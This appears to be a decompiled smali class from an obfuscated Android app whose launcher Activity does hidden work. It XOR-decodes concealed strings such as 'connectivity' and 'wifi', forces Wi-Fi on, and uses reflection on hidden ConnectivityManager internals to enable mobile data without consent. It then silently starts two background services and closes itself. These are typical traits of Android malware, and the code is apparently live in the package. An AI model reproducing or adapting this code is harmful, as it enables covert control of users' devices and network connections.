.class public Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;
.super Landroid/app/Activity;


# static fields
.field private static final a:[Ljava/lang/String;

.field public static b:I


# direct methods
.method static constructor <clinit>()V
    .locals 16

    const/4 v6, 0x3

    const/4 v3, 0x2

    const/4 v1, 0x0

    const/4 v2, 0x1

    const/4 v0, 0x4

    new-array v5, v0, [Ljava/lang/String;

    const-string v4, "a7o#fa,h;jv!"

    const/4 v0, -0x1

    move-object v7, v5

    move-object v8, v5

    move v5, v1

    :goto_0
    invoke-virtual {v4}, Ljava/lang/String;->toCharArray()[C

    move-result-object v4

    array-length v9, v4

    if-gt v9, v2, :cond_2

    move v10, v1

    :cond_0
    move-object v11, v4

    move v12, v10

    move v15, v9

    move-object v9, v4

    move v4, v15

    :goto_1
    aget-char v14, v9, v10

    rem-int/lit8 v13, v12, 0x5

    packed-switch v13, :pswitch_data_0

    move v13, v6

    :goto_2
    xor-int/2addr v13, v14

    int-to-char v13, v13

    aput-char v13, v9, v10

    add-int/lit8 v10, v12, 0x1

    if-nez v4, :cond_1

    move-object v9, v11

    move v12, v10

    move v10, v4

    goto :goto_1

    :cond_1
    move v9, v4

    move-object v4, v11

    :goto_3
    if-gt v9, v10, :cond_0

    new-instance v9, Ljava/lang/String;

    invoke-direct {v9, v4}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v9}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v4

    packed-switch v0, :pswitch_data_1

    aput-object v4, v7, v5

    const-string v0, "o\u000bd?uk;d"

    move-object v4, v0

    move v5, v2

    move-object v7, v8

    move v0, v1

    goto :goto_0

    :pswitch_0
    aput-object v4, v7, v5

    const-string v0, "u1g$"

    move-object v4, v0

    move v5, v3

    move-object v7, v8

    move v0, v2

    goto :goto_0

    :pswitch_1
    aput-object v4, v7, v5

    const-string v0, "q=u\u0000l`1m(Gc,`\u0008mc:m(g"

    move-object v4, v0

    move v5, v6

    move-object v7, v8

    move v0, v3

    goto :goto_0

    :pswitch_2
    aput-object v4, v7, v5

    sput-object v8, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->a:[Ljava/lang/String;

    return-void

    :pswitch_3
    move v13, v3

    goto :goto_2

    :pswitch_4
    const/16 v13, 0x58

    goto :goto_2

    :pswitch_5
    move v13, v2

    goto :goto_2

    :pswitch_6
    const/16 v13, 0x4d

    goto :goto_2

    :cond_2
    move v10, v1

    goto :goto_3

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/z;

    invoke-direct {v0}, Lzvy/zpfypq/bbuhtkwvaf/z;-><init>()V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;

    invoke-virtual {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/z;->a(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lzvy/zpfypq/bbuhtkwvaf/d;->b(Landroid/content/Context;)V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lzvy/zpfypq/bbuhtkwvaf/d;->a(Landroid/content/Context;)V

    :try_start_0
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->a:[Ljava/lang/String;

    const/4 v1, 0x2

    aget-object v0, v0, v1

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->a:[Ljava/lang/String;

    const/4 v1, 0x0

    aget-object v0, v0, v1

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lzvy/zpfypq/bbuhtkwvaf/af;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->a:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    invoke-static {v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/af;->c(Ljava/lang/Class;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    invoke-virtual {v1, v0}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lzvy/zpfypq/bbuhtkwvaf/af;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->a:[Ljava/lang/String;

    const/4 v3, 0x3

    aget-object v2, v2, v3

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    sget-object v5, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v5, v3, v4

    invoke-static {v2, v1, v3}, Lzvy/zpfypq/bbuhtkwvaf/af;->b(Ljava/lang/String;Ljava/lang/Class;[Ljava/lang/Class;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_0
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/LlIlIlllIIIllIllllllLIIlIllllllllIllIlllIlIIIlIILLIIlllI;->finish()V

    return-void

    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0
.end method
